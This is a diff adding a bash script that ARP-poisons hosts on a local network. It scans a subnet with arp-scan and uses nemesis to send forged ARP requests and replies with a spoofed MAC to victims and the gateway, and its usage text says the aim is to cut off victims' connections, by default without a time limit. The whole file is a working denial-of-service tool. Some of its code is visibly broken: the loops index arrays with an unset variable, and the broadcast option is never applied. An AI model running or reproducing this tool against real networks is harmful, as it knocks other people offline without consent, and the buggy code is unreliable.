@@ -1,0 +1,187 @@
+#!/bin/bash
+# Uses Bash arrays
+
+# Poisen the host and gateway w/ request and reply ARPs.
+# Note that ordering is critical: Requests must preceed replies
+# and both requests should happen before both replies in case
+# one of the two sends a reply on broadcast.
+#   Repeat this twice, in case the first attempt was ignored
+# due to the victim not already having an ARP entry for the IP,
+# or in case they coincided with natural ARP traffic.
+
+# A program other than nemesis could be easily used to send the ARP packets.
+# Just create another function, to wrap the ARP packet creation, have it use
+# the first flag as whether or not the packets are "reply" packets, and add
+# a check for that program in the beginning of the script where nemesis is
+# checked for.
+nemesis_poisen() {
+	nemesis arp -S $GATEWAY -h $SPOOFMAC -H $SPOOFMAC -d $IFACE \
+				-D $vic_ip  -m $vic_mac  -M $vic_mac $1 > /dev/null
+	nemesis arp -S $vic_ip  -h $SPOOFMAC -H $SPOOFMAC -d $IFACE \
+				-D $GATEWAY -m $GWMAC    -M $GWMAC   $1 > /dev/null
+}
+
+# Send one burst of packets to each victim
+send_poisen() {
+	target_idx=0
+	while [ $target_idx -lt $total_targets ]; do
+		vic_ip=${target_ips[$host]}
+		vic_mac=${target_macs[$host]}
+		target_idx=$(( target_idx + 1 ))
+
+		# Send the poisen ARP packets
+		$POISEN_FNCTN      # Request
+		$POISEN_FNCTN -r   # Reply
+	done
+}
+
+list_targets() {
+	target_idx=0
+	while [ $target_idx -lt $total_targets ]; do
+		vic_ip=${target_ips[$host]}
+		vic_mac=${target_macs[$host]}
+		target_idx=$(( target_idx + 1 ))
+		echo "Target: $vic_ip - $vic_mac"
+	done
+}
+
+print_usage() {
+	echo "`basename $0` v0.5
+A program to simplify ARP poisening hosts on a network with fake IP/MAC info.
+Both the router and the victim are fed random ARP data about each other, effectively
+terminating the victim's IP-level network connection.
+
+Usage:" `basename $0` "[-t time] [-b] <target>
+   NOTE  : This script depends on \"arp-scan\" and \"nemesis\".
+           Ensure they are installed and their executables are in your PATH.
+  -t time: The number of seconds to spend launching the attack. Bash arithmetic
+           is valid, so to express X minutes, specify X*60. A value of 0 causes
+           the attack to only send one round of packets and then exit. Omission
+           of the field indicates no time limit (terminate with Ctrl^c).
+  -b     : Use FF:FF:FF:FF:FF:FF as the target MAC address. This is useful if
+           the MAC addresses of the targets cannot be determined. It is best
+           left as a last resort.
+  target : The target hosts can be specified as IP addresses or hostnames.  You
+           can also specify the target as IPnetwork/bits (e.g. 192.168.1.0/24)
+           to specify all hosts in the given network (network and broadcast
+           addresses included), or IPstart-IPend (e.g. 192.168.1.3-192.168.1.27)
+           to specify all hosts in the inclusive range. This can be
+		   substituted with -l or --localhost to specify the current network.
+		   (This argument is given directly to arp-scan, so this is subject
+		   to the exact format arp-scan recognizes.)" >&2
+	exit 1
+}
+
+
+###########################
+# Settings and Validation #
+###########################
+
+if [ $# -lt 1 -o $# -gt 4 -o "$1" == "--help" -o "$1" == "-h" ]; then
+	print_usage
+fi
+
+if [ $EUID -ne 0 ]; then
+	echo "You must run" `basename $0` "with root priviledges." >&2
+	exit 1
+fi
+
+if [ -x "`which arpscan 2> /dev/null`" ]; then
+	ARPSCAN="arpscan"
+elif [ -x "`which arp-scan 2> /dev/null`" ]; then
+	ARPSCAN="arp-scan"
+else
+	echo "Error: Cannot find arp-scan. You can get it from:" >&2
+	echo "       http://www.codemonkey.net/~jason/arpscan/" >&2
+	exit 1
+fi
+
+if [ -x "`which nemesis 2> /dev/null`" ]; then
+	POISEN_FNCTN='nemesis_poisen'
+else
+	echo "Error: Cannot find nemesis. You can get it from:" >&2
+	echo "       http://nemesis.sourceforge.net" >&2
+	exit 1
+fi
+
+###################
+# Begin program
+###################
+
+args=("$@")
+last_arg=$(( $# - 1 ))
+target_pattern="${args[$last_arg]}"
+broadcast_attack=0
+time_run=-1   # Never ending attack by default.
+
+while getopts t:b op; do
+	case "$op" in
+	t)
+		if [ "$OPTARG" != "" ]; then
+			time_run=$(( $OPTARG ))
+		fi
+	;;
+	b)
+		broadcast_attack=1
+	;;
+	esac
+done
+
+NETWORK=`route -n | grep "UG" | awk '{print $2,$8}'`
+GATEWAY=`echo "$NETWORK" | cut -d ' ' -f 1`
+IFACE=`echo "$NETWORK" | cut -d ' ' -f 2`
+
+MACHINE_INFO="`ifconfig $IFACE | grep 'inet addr'`"
+SELF_IP=`echo "$MACHINE_INFO" | cut -d ':' -f 2 | awk '{print $1}'`
+NETMASK=`echo "$MACHINE_INFO" | cut -d ':' -f 4`
+
+GWMAC=`$ARPSCAN $GATEWAY --interface $IFACE | grep $GATEWAY | awk '{print $2}'`
+SPOOFMAC="fe:ed:0d:ad:be:ef"   # TODO: make this random
+
+####################
+# Victim searching #
+####################
+
+if [ "$target_pattern" = "" ]; then
+	SCAN_CMD="$ARPSCAN --interface $IFACE --localnet"
+else
+	SCAN_CMD="$ARPSCAN --interface $IFACE $target_pattern"
+fi
+
+# Scan the network and get the list of IPs -> MACs of all victims. Targeting the
+# victim by MAC makes it more likely the victim will listen to the packet, and
+# may avoid contaminating other hosts on the network.
+#   Also, filter out this machine out, in case it was in the target range.
+target_list=`$SCAN_CMD | egrep "^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" | grep -v "$SELF_IP" | awk '{print $1,$2}'`
+
+if [ "$target_list" = "" ]; then
+	if [ $broadcast_attack -eq 0 ]; then
+		echo "Error: No hosts found. If they exist, they are not responding to"
+		echo "       ARP requests so their MACs are unknown. Use -b to enable"
+		echo "       broadcast mode and proceed anyway."
+		exit 1
+	fi
+fi
+
+total_targets=`echo "$target_list" | wc -l`
+target_ips=( `echo "$target_list" | cut -d ' ' -f 1 | xargs` )
+target_macs=( `echo "$target_list" | cut -d ' ' -f 2 | xargs` )
+
+# Print out the identified targets on the first round.
+list_targets
+
+#############
+# Attacking #
+#############
+
+# If no time period was specified, just send a one packet burst.
+send_poisen
+
+get_time_current="date +%s"
+time_stop=$(( `$get_time_current` + time_run ))
+while [ `$get_time_current` -lt $time_stop -o $time_run -eq -1 ]; do
+	sleep 1
+	send_poisen
+done
+
+exit 0
